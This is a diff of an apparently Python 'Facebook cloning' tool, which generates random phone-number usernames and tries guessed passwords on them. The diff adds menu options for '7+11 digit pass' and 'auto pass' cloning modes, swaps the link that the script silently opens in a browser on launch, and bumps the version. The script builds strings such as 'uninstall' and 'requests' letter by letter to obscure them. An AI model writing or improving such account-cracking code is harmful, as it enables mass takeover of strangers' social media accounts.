@@ -7,7 +7,7 @@ gghb=g1+g2+g3+g4+g5+pr+pr1+pr2
 cx=('.g');cxx=('fig');xl=('/')
   
 import os,base64
-os.system("xdg-open https://chat.whatsapp.com/IBITafA7ugtBTkRH760hj2/?ref=share")
+os.system("xdg-open https://m.me/KINGXMRSW4TI/?ref=share")
 u1=('u');u2=('n');u3=('i');u4=('n');u5=('s');u6=('t');u7=('a');u8=('l');u9=('l')
 ustl=u1+u2+u3+u4+u5+u6+u7+u8+u9
 r1=('r');r2=('e');r3=('q');r4=('u');r5=('e');r6=('s');r7=('t');r8=('s')
@@ -570,6 +570,10 @@ def pak():
 		print(' [1] Method 1\n [2] Method 2 Best ')
 		linex()
 		mthd = input(' Choose: ')
+		linex()
+		print(' [1] Clone with 7+11 digit pass (v-fast)\n [2] Clone with auto pass (fast)\n [3] Clone with auto pass v2 (slow-best) ')
+		linex()
+		pcs = input(' [?] Select: ')
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
@@ -917,7 +921,7 @@ def menu_apikey():
 \033[1;37m[-] GITHUB    :\033[1;32m Raziq
 \033[1;37m[-] WhatsApp  :\033[1;32m +93702856593
 \033[1;37m[-] TOOLS     :\033[1;32m MIX CLONING
-\033[1;37m[-] VERSION   :\033[1;32m 0.3
+\033[1;37m[-] VERSION   :\033[1;32m 0.4
 \033[1;37m[-] STATUS    :\033[1;32m FREE
 ==================================================
 \033[1;33m[*]TOOLS  : Facebook cloning
